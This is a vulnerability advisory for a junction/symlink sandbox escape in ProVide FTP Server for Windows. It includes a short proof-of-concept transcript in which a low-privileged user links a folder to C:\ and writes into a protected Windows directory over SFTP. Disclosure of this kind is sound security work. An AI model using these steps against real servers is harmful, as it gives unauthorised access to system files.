# Jail Escape via Symlink

## Summary

It was identified that ProVide FTP Server (formerly zFTP) for Windows, doesn't enforce permission over Windows Symlinks or Junctions. As a result, a low privileged user (non-admin), can craft a Junction Link in a directory he has full control, breaking out of the sandbox.

## VulDB-Like Summary

A vulnerability has been found in ProVide FTP Server (formerly zFTP) for Windows up to v13.1 and classified as problematic. This vulnerability affects some unknown functionality. The manipulation with an unknown input leads to a sandbox bypass vulnerability. The CWE definition for the vulnerability is CWE-284. As an impact it is known to affect confidentiality, integrity, and availability.

The weakness was disclosed 04/06/2020 by Alessandro Magnosi (deadc0de) (GitHub Repository). It is possible to read the advisory at github.com. This vulnerability is known as CVE-2020-XXXX. The attack should be launched initiated locally. The exploitation needs multiple authentications to be performed. Technical details of the vulnerability are known, but there is no available exploit.

## Proof-of-Concept

#### User 1 - Low Privileged FTP User

Root Directory: C:\Users\lowpriv\Desktop\
Permission on Root Directory: 
* Files: Read, Write, Delete, Append 
* Dirs: List, Make, Delete, +Subdirs

#### User 2 - Low Privileged Windows User

Windows User: lowpriv
Standard User, no admin rights

```
C:\Users\lowpriv\Desktop> whoami
lowpriv
C:\Users\lowpriv\Desktop> mklink /J escape C:\
Junction created for escape <<===>> C:\
C:\Users\lowpriv\Desktop> mkdir C:\Windows\security\audit\pwnd
Access is denied.
C:\Users\lowpriv\Desktop> sftp lowpriv@127.0.0.1
Connected to lowpriv@127.0.0.1.
sftp> dir
Google Chrome.lnk  desktop.ini        escape
sftp> mkdir /escape/Windows/security/audit/pwnd
sftp> cd /escape/Windows/security/audit/pwnd
sftp> pwd
Remote working directory: /escape/Windows/security/audit/pwnd/
sftp>
```

## Remediation

No remediation currently exists for the.

## References

* https://cwe.mitre.org/data/definitions/284.html
* https://cwe.mitre.org/data/definitions/501.html
* https://cwe.mitre.org/data/definitions/266.html 
